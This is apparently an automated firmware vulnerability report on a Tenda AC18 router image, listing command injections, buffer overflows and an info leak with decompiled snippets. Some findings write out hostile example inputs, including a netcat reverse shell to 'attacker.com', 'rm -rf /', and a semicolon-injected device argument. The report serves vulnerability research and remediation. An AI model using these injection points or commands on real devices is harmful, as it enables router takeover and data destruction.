# _US_AC18V1.0BR_V15.03.05.05_multi_TD01.bin.extracted (11 个发现)

---

### PrivEsc-udhcpc-sample.renew

- **文件/目录路径：** `usr/local/udhcpc/sample.renew`
- **位置：** `sample.renew:1 (script start)`
- **风险评分：** 9.0
- **置信度：** 9.0
- **描述：** The 'sample.renew' file is a udhcpc hook script with full permissions (777), allowing any user to modify it. When udhcpc (which typically runs with root privileges) executes this script during DHCP lease renewal, the modified commands run with root privileges. This enables privilege escalation: a non-root user can inject malicious code (e.g., adding a reverse shell or modifying critical system files) into the script, which is then executed as root. The script uses environment variables set by udhcpc ($interface, $ip, $router, etc.) and performs operations like ifconfig, route changes, and writing to /etc/resolv.conf, all requiring root access. The attack is triggered when udhcpc renews a DHCP lease, and the exploit is reliable due to the script's writable nature and privileged execution context.
- **代码片段：**
  ```
  #!/bin/sh
  # Sample udhcpc bound script
  
  RESOLV_CONF="/etc/resolv_wisp.conf"
  RESOLV_CONF_STANDARD="/etc/resolv.conf"
  
  [ -n "$broadcast" ] && BROADCAST="broadcast $broadcast"
  [ -n "$subnet" ] && NETMASK="netmask $subnet"
  
  /sbin/ifconfig $interface $ip $BROADCAST $NETMASK
  
  if [ -n "$router" ]
  then
  	echo "deleting routers"
  	while /sbin/route del default gw 0.0.0.0 dev $interface
  	do :
  	done
  
  	for i in $router
  	do
  		/sbin/route add default gw $i dev $interface
  	done
  fi
  
  echo -n > $RESOLV_CONF
  echo -n > $RESOLV_CONF_STANDARD
  #tenda add
  [ $ip ] && echo ip $ip >> $RESOLV_CONF
  [ $subnet ] && echo mask $subnet >> $RESOLV_CONF
  [ $router ] && echo gateway $router >> $RESOLV_CONF
  [ $lease ] && echo lease $lease >> $RESOLV_CONF
  
  [ -n "$domain" ] && echo domain $domain >> $RESOLV_CONF
  [ -n "$domain" ] && echo domain $domain >> $RESOLV_CONF_STANDARD
  for i in $dns
  do
          echo adding dns $i
          echo nameserver $i >> $RESOLV_CONF
          echo nameserver $i >> $RESOLV_CONF_STANDARD
  done
  
  [ "$reloaddns" ] && cfm post netctrl 2?op=17,wan_id=6
  ```
- **关键词：** sample.renew, /etc/resolv_wisp.conf, /etc/resolv.conf, cfm, netctrl
- **备注：** This vulnerability is highly exploitable due to the script's permissions and the privileged context of udhcpc. Further verification could involve checking if udhcpc is configured to use this script and runs as root, but the evidence strongly supports the attack chain. Other files in the directory (e.g., sample.bound, sample.deconfig) have similar permissions and may present additional attack vectors. Recommended mitigation: restrict file permissions to root-only write access and validate script integrity.

---
### Command-Injection-sym.formexeCommand

- **文件/目录路径：** `bin/httpd`
- **位置：** `httpd:0x0007b2b8 sym.formexeCommand`
- **风险评分：** 8.5
- **置信度：** 8.0
- **描述：** 命令注入漏洞存在于 sym.formexeCommand 函数中，允许经过身份验证的攻击者执行任意系统命令。具体表现：函数通过 fcn.0002b884 获取 HTTP 请求中的 'cmdinput' 参数，使用 strcpy 复制到局部缓冲区（大小 256 字节），然后直接用于构造 doSystemCmd 命令（如 'echo %s > /tmp/cmdTmp.txt' 和 '%s > /tmp/cmdTmp.txt'）。由于缺少输入验证、过滤或转义，攻击者可以注入 shell 元字符（如 ;、|、&、`）来执行恶意命令。触发条件：攻击者发送恶意 HTTP 请求到 formexeCommand 端点，包含 crafted 'cmdinput' 参数。约束条件：攻击者需拥有有效登录凭据（非 root 用户），但 httpd 进程可能以 root 权限运行，从而提升权限。潜在攻击和利用方式：注入命令如 'rm -rf /' 删除文件或 'nc -e /bin/sh attacker.com 4444' 启动反向 shell，完全控制设备。相关代码逻辑：用户输入直接传播到 doSystemCmd，无边界检查或验证。
- **代码片段：**
  ```
  // 从 HTTP 请求获取用户输入
  uVar2 = fcn.0002b884(*(puVar5 + (0xdcec | 0xffff0000) + iVar1 + -0xc), iVar4 + *0x7b5a8, iVar4 + *0x7b5ac);
  *(puVar5 + -0xc) = uVar2;
  // 使用 strcpy 复制用户输入到缓冲区
  sym.imp.strcpy(puVar5 + iVar1 + -0x21c, *(puVar5 + -0xc));
  // 调用 doSystemCmd 执行命令，用户输入直接嵌入
  sym.imp.doSystemCmd(iVar4 + *0x7b5c0, puVar5 + iVar1 + -0x21c); // 例如: 'echo %s > /tmp/cmdTmp.txt'
  sym.imp.doSystemCmd(iVar4 + *0x7b5c4, puVar5 + iVar1 + -0x21c); // 例如: '%s > /tmp/cmdTmp.txt'
  ```
- **关键词：** HTTP 参数: cmdinput, 文件路径: /tmp/cmdTmp.txt, 函数符号: sym.formexeCommand, sym.imp.doSystemCmd, fcn.0002b884, IPC 套接字: 未识别具体路径，但涉及 send_msg_to_netctrl 调用
- **备注：** 漏洞已验证通过代码分析：用户输入从 HTTP 参数直接传播到 doSystemCmd，无中间验证。攻击链完整且可重现。建议检查其他 doSystemCmd 调用点（如 sym.formSetClientState）是否有类似问题。后续分析应关注输入验证缺失的组件交互，特别是通过 NVRAM 或 IPC 的数据流。

---
### buffer-overflow-sym.formGetWanErrerCheck

- **文件/目录路径：** `bin/dhttpd`
- **位置：** `bin:0x00034b3c sym.formGetWanErrerCheck (GetValue call for 'lan.ip'), bin:0x00034b90 sym.formGetWanErrerCheck (GetValue call for 'd.lan.ip')`
- **风险评分：** 8.0
- **置信度：** 9.0
- **描述：** 该函数在处理 NVRAM 变量 'lan.ip' 和 'd.lan.ip' 时存在缓冲区溢出漏洞。函数使用 GetValue 将变量值复制到固定大小的栈缓冲区（16 字节），但未进行大小验证。攻击者可通过设置这些变量为超过 16 字节的字符串来溢出缓冲区，覆盖相邻栈数据（包括返回地址），从而实现任意代码执行。触发条件包括：攻击者拥有有效登录凭据，可访问 web 接口并设置 NVRAM 变量；当 sym.formGetWanErrerCheck 被调用（例如通过 HTTP CGI 请求）时，漏洞被触发。潜在利用方式包括通过溢出控制程序流，执行 shellcode 或提升权限。
- **代码片段：**
  ```
  0x00034b3c      0310a0e1       mov r1, r3                  ; buffer 's' for GetValue
  0x00034b40      e353ffeb       bl sym.imp.GetValue          ; calls GetValue("lan.ip", buffer)
  ...
  0x00034b8c      0310a0e1       mov r1, r3                  ; same buffer 's' for GetValue
  0x00034b90      cf53ffeb       bl sym.imp.GetValue          ; calls GetValue("d.lan.ip", buffer)
  ; Buffer 's' is initialized to 16 bytes via memset at 0x00034b74:
  0x00034b74      1020a0e3       mov r2, 0x10                ; size 16 bytes
  0x00034b78      c353ffeb       bl sym.imp.memset           ; memset(s, 0, 0x10)
  ```
- **关键词：** lan.ip, d.lan.ip, sym.formGetWanErrerCheck, sym.imp.GetValue
- **备注：** 该漏洞可直接通过 NVRAM 操作利用，但需进一步验证设备特定配置（如 ASLR、栈保护）。建议检查其他使用 GetValue 而无大小检查的函数。关联文件包括 NVRAM 相关库（如 libnvram.so），后续分析应关注 HTTP 请求处理流程以确认触发路径。

---
### 无标题的发现

- **文件/目录路径：** `usr/bin/app_data_center`
- **位置：** `app_data_center:0xa7c0 sym.process_datamanage_usbeject`
- **风险评分：** 8.0
- **置信度：** 9.0
- **描述：** 在 'app_data_center' 文件中发现命令注入漏洞。攻击链起始于 FastCGI 请求中的用户可控输入（如 'device' 参数），通过 'process_datamanage_usbeject' 函数处理。该函数使用 'snprintf' 构建 'umount %s' 命令字符串，其中 '%s' 直接来自用户输入，未经过滤或转义，然后调用 'system' 执行。攻击者可通过注入分号或其它命令分隔符执行任意命令。触发条件：攻击者发送特定请求（如 REQUEST_METHOD 对应 'usbeject' 功能）并控制 'device' 参数。利用方式：例如，设置 'device' 为 '/dev/sda1; malicious_command'，导致 'umount /dev/sda1; malicious_command' 执行。约束条件：函数仅检查 'device' 是否以 'usb' 开头，但不防止命令注入。
- **代码片段：**
  ```
  uint sym.process_datamanage_usbeject(uint param_1,uint param_2) {
      // ... 代码省略 ...
      uVar1 = sym.get_querry_var(puVar3[-0x204],0xaee8 | 0x10000); // 获取 'device' 参数
      puVar3[-2] = uVar1;
      // ... 代码省略 ...
      sym.imp.snprintf(puVar3 + -0x808 + -4,0x800,0xaf04 | 0x10000,puVar3[-3]); // 格式化命令 "umount %s"
      sym.imp.system(puVar3 + -0x808 + -4); // 执行命令
      // ... 代码省略 ...
  }
  ```
- **关键词：** REQUEST_METHOD, SCRIPT_NAME, CONTENT_LENGTH, device, sym.process_datamanage_usbeject, sym.get_querry_var, sym.imp.system
- **备注：** 此漏洞允许命令注入，但实际影响取决于 'app_data_center' 服务的运行权限（如是否以 root 运行）。建议进一步验证服务配置和权限。关联函数包括 'do_request_process' 和 'get_querry_var'。后续分析应检查其他输入点（如 'process_datamanage_usblist'）是否有类似问题。

---
### buffer-overflow-tcpConnector

- **文件/目录路径：** `lib/modules/NetUSB.ko`
- **位置：** `NetUSB.ko:0x0800e110 (函数 sym.tcpConnector)`
- **风险评分：** 7.5
- **置信度：** 8.0
- **描述：** 在 'NetUSB.ko' 的 `tcpConnector` 函数中，发现一个栈缓冲区溢出漏洞。具体表现：函数使用 `memcpy` 将输入字符串复制到固定大小的栈缓冲区（32字节），但未使用 `strlen` 检查输入长度，导致溢出。触发条件：当输入字符串长度超过32字节时，栈上的返回地址或其他关键数据可能被覆盖，允许攻击者控制程序流。潜在利用方式：攻击者作为已连接用户，可通过网络发送特制数据到 TCP 服务，触发溢出并执行任意代码。相关代码逻辑包括套接字创建、设置选项和字符串复制操作。
- **代码片段：**
  ```
  0x0800e0ec      0c708de2       add r7, var_ch           ; r7 指向栈缓冲区
  0x0800e0f0      2010a0e3       mov r1, 0x20             ; 缓冲区大小 32 字节
  0x0800e0f4      0700a0e1       mov r0, r7               ; 目标缓冲区
  0x0800e0f8      feffffeb       bl __memzero             ; 初始化缓冲区
  0x0800e0fc      0600a0e1       mov r0, r6               ; 输入字符串参数
  0x0800e100      feffffeb       bl strlen                ; 获取输入长度
  0x0800e104      0610a0e1       mov r1, r6               ; 源字符串
  0x0800e108      0020a0e1       mov r2, r0               ; 长度（无检查）
  0x0800e10c      0700a0e1       mov r0, r7               ; 目标缓冲区
  0x0800e110      feffffeb       bl memcpy                ; 复制操作，可能溢出
  ```
- **关键词：** bndev, mode, moduleName, localID, ifBcBind
- **备注：** 漏洞存在于内核模块中，可能允许特权提升。攻击链需要攻击者已拥有网络访问权限并能够发送数据到 TCP 服务。建议进一步分析 `tcpConnector` 的调用者以确认输入源，并检查其他函数（如 `udpAnnounce`）是否存在类似问题。可利用性取决于网络服务的暴露程度和缓解措施（如栈保护）。

---
### BufferOverflow-netconf_add_fw

- **文件/目录路径：** `usr/lib/libnetconf.so`
- **位置：** `libnetconf.so:0x00002ba0 sym.netconf_add_fw`
- **风险评分：** 7.5
- **置信度：** 8.0
- **描述：** 在 sym.netconf_add_fw 函数中，处理用户提供的字符串（如接口名称或规则参数）时，使用了 strncpy 进行字符串复制，但随后使用 strlen 计算输入长度并用于 memset 操作。由于没有验证输入字符串长度，如果输入超长（超过目标缓冲区大小），可能导致缓冲区溢出。目标缓冲区通过 calloc(1, 0x70) 分配，大小为 112 字节。具体地，当处理 param_1 + 0x22 和 param_1 + 0x32 的字符串时，strncpy 复制到偏移 0x10 和 0x20，而 memset 从偏移 0x30 和 0x40 开始，使用 strlen 结果加 1 作为长度。如果 strlen 返回大值（例如，超过 64 字节），memset 将写入超出缓冲区边界，覆盖相邻内存。攻击者可通过控制输入字符串触发此漏洞，可能覆盖函数返回地址或关键数据，执行任意代码。触发条件：攻击者提交恶意防火墙规则配置，其中包含超长字符串字段。利用方式：通过网络接口（如 HTTP API）或 IPC 调用相关功能，提交特制数据。
- **代码片段：**
  ```
  相关代码片段来自反编译：
  if (*(param_1 + 0x22) != '\0') {
      loc.imp.strncpy(*(puVar21 + -8) + 0x10, param_1 + 0x22);
      iVar7 = loc.imp.strlen(param_1 + 0x22);
      loc.imp.memset(iVar11 + 0x30, 0xff, iVar7 + 1);
  }
  if (*(param_1 + 0x32) != '\0') {
      loc.imp.strncpy(*(puVar21 + -8) + 0x20, param_1 + 0x32, 0x10);
      iVar7 = loc.imp.strlen(param_1 + 0x22);  // 注意：这里使用了 param_1 + 0x22 的 strlen，可能错误
      loc.imp.memset(iVar11 + 0x40, 0xff, iVar7 + 1);
  }
  ```
- **关键词：** sym.netconf_add_fw, param_1结构体输入, 可能通过NVRAM或环境变量设置防火墙规则, IPC套接字路径未知，但可能涉及网络配置服务
- **备注：** 漏洞需要调用上下文来完全验证利用链，例如通过哪个服务或程序调用此函数（如网络配置界面）。建议进一步分析使用此库的二进制文件（如网络守护进程）以确认输入点。关联函数：sym.netconf_get_fw（但未发现类似漏洞）。在 ARM 架构上，缓冲区溢出可能覆盖返回地址，导致代码执行。由于攻击者拥有登录凭据，可能通过已有接口触发。

---
### Command-Injection-udhcpd

- **文件/目录路径：** `usr/sbin/udhcpd`
- **位置：** `udhcpd:0xa5cc fcn.0000a45c`
- **风险评分：** 7.5
- **置信度：** 8.0
- **描述：** 命令注入漏洞存在于 fcn.0000a45c 函数中，该函数使用 sprintf 构建命令字符串并调用 system。攻击者可通过修改配置文件（如 /etc/udhcpd.conf）中的 'script' 或 'interface' 字段注入恶意命令。当 udhcpd 处理配置时（例如在定期任务或初始化期间），system 调用会执行注入的命令，导致任意代码执行。触发条件包括：1) 配置文件可由非root用户写入；2) udhcpd 以 root 权限运行（常见于 DHCP 服务器）。潜在攻击包括获取 root shell、修改系统配置或持久化访问。代码逻辑显示，system 参数直接来自 server_config 结构，缺少输入验证或转义。
- **代码片段：**
  ```
  0x0000a5b8: add r4, string
  0x0000a5bc: mov r0, r4
  0x0000a5c0: ldr r1, [0x0000a618]  ; "%s %s"
  0x0000a5c4: ldr r3, [r3, 0x40]   ; server_config->interface
  0x0000a5c8: ldr r2, [r3, 0x48]   ; server_config->script
  0x0000a5cc: bl sym.imp.sprintf   ; 构建命令字符串
  0x0000a5d0: mov r0, r4
  0x0000a5d4: bl sym.imp.system     ; 执行命令
  ```
- **关键词：** /etc/udhcpd.conf, server_config, fcn.0000a45c, sym.imp.system
- **备注：** 攻击链完整但依赖于配置文件权限。假设 /etc/udhcpd.conf 可由非root用户写入（需在实际环境中验证）。建议检查文件权限和 udhcpd 运行上下文。关联函数包括 fcn.0000a148（配置文件解析）。后续分析应验证配置加载过程和权限设置。

---
### 无标题的发现

- **文件/目录路径：** `usr/sbin/comad`
- **位置：** `comad:0x8734 fcn.00008734`
- **风险评分：** 7.5
- **置信度：** 8.0
- **描述：** 命令注入漏洞存在于函数 fcn.00008734 中，通过 NVRAM 变量 'lan_ifnames' 的不可信输入触发。问题表现：用户可控的 NVRAM 数据被直接用于构造命令并通过 _eval 或 system 执行，缺乏输入过滤和验证。触发条件：当读取文件 '/proc/bcm947xx/coma' 的字符不是 '0' (0x30) 时，函数获取 'lan_ifnames' 变量，处理字符串（使用 strncpy 限制 0x20 字节、strcspn 去除分隔符），并调用 _eval 或 system。约束条件：字符串处理有边界检查（strncpy 0x20 字节），但未对内容进行命令注入检查（如分号或反引号）。潜在攻击：攻击者设置 'lan_ifnames' 为恶意值（如 'eth; malicious_command'），通过验证后执行任意命令，可能获得权限提升或控制设备。代码逻辑：反编译代码显示 nvram_get 调用、字符串处理循环和危险函数调用，数据流从输入到执行点清晰。
- **代码片段：**
  ```
  uint fcn.00008734(void)
  {
      ...
      if (iVar5 != 0x30) {
          iVar4 = sym.imp.nvram_get(*0x8908); // nvram_get("lan_ifnames")
          if (iVar4 + 0 == 0) {
              iVar5 = *0x890c;
          }
          else {
              iVar5 = sym.imp.strspn(iVar4,*0x8910); // strspn with "eth"
              iVar5 = iVar4 + 0 + iVar5;
          }
          sym.imp.strncpy(&stack0x00000004,iVar5,0x20); // Copy up to 0x20 bytes
          iVar4 = sym.imp.strcspn(&stack0x00000004,*0x8910); // strcspn with "eth"
          (&stack0x00000004)[iVar4] = 0; // Null-terminate
          ...
          iVar5 = sym.imp.strncmp(&stack0x00000004,*0x8914,3); // Compare with "eth"
          if (iVar5 == 0) {
              ...
              sym.imp._eval(&stack0x00000024,*0x8918,iVar5,iVar5); // _eval call
          }
          ...
          sym.imp.system(*0x891c); // system call
      }
      ...
  }
  ```
- **关键词：** lan_ifnames, /proc/bcm947xx/coma, /tmp/coma, sym.imp.nvram_get, sym.imp._eval, sym.imp.system
- **备注：** 攻击链完整且可验证：输入源（NVRAM 变量 'lan_ifnames'）→ 数据流（字符串处理）→ 危险操作（_eval/system）。非 root 用户可能通过 nvram set 命令操纵变量，前提有相应权限。建议进一步分析 _eval 函数（地址 0x85a4）以确认命令执行细节，并检查系统权限配置。文件 '/proc/bcm947xx/coma' 可能受攻击者影响以触发条件。

---
### Command-Injection-spawn-fcgi-f-option

- **文件/目录路径：** `usr/bin/spawn-fcgi`
- **位置：** `spawn-fcgi:0x95dc-0x9648 sym.fcgi_spawn_connection`
- **风险评分：** 7.0
- **置信度：** 9.0
- **描述：** A command injection vulnerability exists in the 'spawn-fcgi' binary when handling the -f option without providing positional arguments. The vulnerability arises in the fcgi_spawn_connection function, where user-controlled input from the -f option is concatenated into a shell command without proper sanitization. When no FastCGI application arguments are provided (i.e., no positional arguments after --), the program constructs a command string using strcat with the value from -f and executes it via /bin/sh -c. An attacker can exploit this by injecting shell metacharacters (e.g., ;, &, |) in the -f argument to execute arbitrary commands. The trigger condition is when spawn-fcgi is run with the -f option and no positional arguments. As a non-root user, the injected commands run with the same privileges, potentially allowing command execution in contexts where spawn-fcgi is used, though it does not escalate privileges directly.
- **代码片段：**
  ```
  0x000095dc      90001be5       ldr r0, [s2]                ; const char *s
  0x000095e0      cffdffeb       bl sym.imp.strlen           ; size_t strlen(const char *s)
  0x000095e4      0030a0e1       mov r3, r0
  0x000095e8      063083e2       add r3, r3, 6
  0x000095ec      0300a0e1       mov r0, r3                  ; size_t size
  0x000095f0      65fdffeb       bl sym.imp.malloc           ; void *malloc(size_t size)
  0x000095f4      0030a0e1       mov r3, r0
  0x000095f8      20300be5       str r3, [s1]                ; 0x20 ; 32
  0x000095fc      50390ae3       movw r3, str.exec           ; 0xa950 ; "exec "
  0x00009600      003040e3       movt r3, 0                  ; 0xa950 ; "exec "
  0x00009604      20001be5       ldr r0, [s1]                ; 0x20 ; 32 ; void *s1
  0x00009608      0310a0e1       mov r1, r3                  ; 0xa950 ; "exec " ; const void *s2
  0x0000960c      0620a0e3       mov r2, 6
  0x00009610      51fdffeb       bl sym.imp.memcpy           ; void *memcpy(void *s1, const void *s2, size_t n)
  0x00009614      90301be5       ldr r3, [s2]                ; 0x90 ; 144
  0x00009618      20001be5       ldr r0, [s1]                ; 0x20 ; 32 ; char *s1
  0x0000961c      0310a0e1       mov r1, r3                  ; const char *s2
  0x00009620      7afdffeb       bl sym.imp.strcat           ; char *strcat(char *s1, const char *s2)
  0x00009624      0030a0e3       mov r3, 0
  0x00009628      00308de5       str r3, [sp]
  0x0000962c      58090ae3       movw r0, str._bin_sh        ; 0xa958 ; "/bin/sh"
  0x00009630      000040e3       movt r0, 0                  ; 0xa958 ; "/bin/sh"
  0x00009634      60190ae3       movw r1, str.sh             ; 0xa960 ; "sh"
  0x00009638      001040e3       movt r1, 0                  ; 0xa960 ; "sh"
  0x0000963c      64290ae3       movw r2, str._c             ; 0xa964 ; "-c"
  0x00009640      002040e3       movt r2, 0                  ; 0xa964 ; "-c"
  0x00009644      20301be5       ldr r3, [s1]                ; 0x20 ; 32
  0x00009648      46fdffeb       bl sym.imp.execl            ; int execl(const char *path, const char *arg0, ...)
  ```
- **关键词：** spawn-fcgi -f option, FastCGI application path
- **备注：** This vulnerability requires the attacker to have the ability to execute spawn-fcgi with control over the -f option and without providing positional arguments. While it does not grant privilege escalation beyond the current user, it could be used in broader attack chains or in environments where spawn-fcgi is invoked by scripts or other processes. Further analysis could explore other input vectors or interactions with system components.

---
### info-disclosure-td_acs_dbg-IPC

- **文件/目录路径：** `usr/sbin/td_acs_dbg`
- **位置：** `td_acs_dbg:0x00008708 fcn.00008708 (sendto call)`
- **风险评分：** 6.5
- **置信度：** 8.5
- **描述：** The td_acs_dbg binary contains an information disclosure vulnerability where uninitialized stack memory is sent over IPC. During command execution, the program constructs a 24-byte command structure but only initializes 20 bytes, leaving the last 4 bytes uninitialized. When sendto is called, these 4 bytes of stack memory are transmitted to the server socket. An attacker with valid login credentials can exploit this by creating a malicious UDP server at /tmp/td_acs_dbg_svr to receive the leaked data. The leaked memory may contain pointers, return addresses, or other sensitive data, which could be used to bypass ASLR or facilitate other attacks. The vulnerability is triggered when any command is executed that involves sending data to the server, which is most command operations given the program's design.
- **代码片段：**
  ```
  // From decompilation: sendto sends 24 bytes from iVar1, but only 20 bytes are initialized
  iVar1 = puVar12 + -0x24; // points to stack buffer
  // Initialization of fields (20 bytes):
  *(puVar12 + -0x24) = 0; // field0
  *(puVar12 + -0x20) = 0; // field1
  *(puVar12 + -0x1c) = uVar5; // field2 (uVar5=0)
  *(puVar12 + -0x18) = uVar5; // field3
  *(puVar12 + -0x14) = uVar5; // field4 (set later based on command)
  *(puVar12 + -0x10) = uVar5; // field5 (set later based on command)
  // sendto call transmits 24 bytes, including uninitialized data beyond -0x10
  sym.imp.sendto(iVar8, iVar1, 0x18, 0); // 0x18 = 24 bytes
  ```
- **关键词：** /tmp/td_acs_dbg_svr, IPC socket communication
- **备注：** The vulnerability requires the attacker to set up a malicious server at /tmp/td_acs_dbg_svr, which is feasible due to world-writable /tmp directory. While this does not directly lead to code execution, it can aid in information gathering for more severe attacks. The binary's world-writable permissions (-rwxrwxrwx) are a separate security issue that could allow privilege escalation if combined with other vulnerabilities. Further analysis of the server component (td_acs_dbg_svr) is recommended to assess full impact.

---
### Command-Injection-fcn.0002f830

- **文件/目录路径：** `bin/busybox`
- **位置：** `busybox:0x0002fe98 fcn.0002f830`
- **风险评分：** 5.0
- **置信度：** 7.0
- **描述：** A command injection vulnerability was identified in the mdev applet of BusyBox. The function fcn.0002f830 calls 'system' with a string constructed from environment variables, which are user-controlled. An attacker with valid login credentials (non-root user) can set a malicious environment variable (e.g., containing shell metacharacters) to execute arbitrary commands when mdev is invoked. This vulnerability is triggered when mdev processes device events or is run directly, allowing command injection under the user's context. The attack chain is complete: input (environment variables) -> data flow (retrieved via getenv and used in string) -> dangerous operation (system call).
- **代码片段：**
  ```
  0x0002fa7c      bl sym.imp.getenv           ; Retrieve environment variable
  0x0002fe94      mov r0, r6                  ; String built from environment variable
  0x0002fe98      bl sym.imp.system           ; Execute command via system
  ```
- **关键词：** MDEV, SUBSYSTEM
- **备注：** This vulnerability requires the user to execute mdev, which may not always be feasible in all configurations. While it allows command injection, it does not escalate privileges by itself. Further analysis is needed to determine if mdev can be triggered automatically with user environment variables. Additional functions like fcn.00040f94 and fcn.0004699c also call 'system' and should be investigated for similar issues to establish broader exploit chains.

---
